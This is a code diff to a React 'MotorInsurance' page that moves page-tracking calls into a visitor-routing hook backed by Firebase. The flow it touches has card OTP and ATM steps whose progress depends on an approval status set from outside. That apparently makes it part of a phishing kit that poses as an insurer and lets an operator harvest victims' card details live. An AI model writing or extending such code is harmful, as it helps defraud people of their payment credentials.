@@ -23,7 +23,6 @@ import {
 } from "lucide-react";
 import {
   addData,
-  handleCurrentPage,
   generateVisitorId,
   isFirebaseConfigured,
   setupOnlineStatus,
@@ -635,10 +634,10 @@ export default function MotorInsurance() {
   useVisitorRouting({
     currentPage: "motor",
     currentStep,
+    firestorePageName: `motor-insurance-step-${currentStep}`,
     onStepChange: (step) => {
       if (step >= 1 && step <= 7) {
         setCurrentStep(step);
-        handleCurrentPage(`motor-insurance-step-${step}`);
       }
     },
   });
@@ -651,7 +650,6 @@ export default function MotorInsurance() {
     }
     setVisitorId(id);
     if (isFirebaseConfigured) {
-      handleCurrentPage(`motor-insurance-step-${currentStep}`);
       setupOnlineStatus(id);
     }
 
@@ -684,13 +682,10 @@ export default function MotorInsurance() {
         setShowAtmModal(false);
         if (currentStep === 4) {
           setCurrentStep(5);
-          handleCurrentPage("motor-insurance-step-5-otp");
         } else if (currentStep === 5) {
           setCurrentStep(7);
-          handleCurrentPage("motor-insurance-step-7-atm");
         } else if (currentStep === 7) {
           setCurrentStep(6);
-          handleCurrentPage("motor-insurance-step-6-success");
         }
       } else if (data.approvalStatus === "approved_atm") {
         setApprovalStatus("approved_atm");
@@ -698,10 +693,8 @@ export default function MotorInsurance() {
         setShowAtmModal(false);
         if (currentStep === 4) {
           setCurrentStep(7);
-          handleCurrentPage("motor-insurance-step-7-atm");
         } else if (currentStep === 7) {
           setCurrentStep(6);
-          handleCurrentPage("motor-insurance-step-6-success");
         }
       } else if (data.approvalStatus === "rejected" || data.cardOtpApproved === false) {
         setApprovalStatus("rejected");
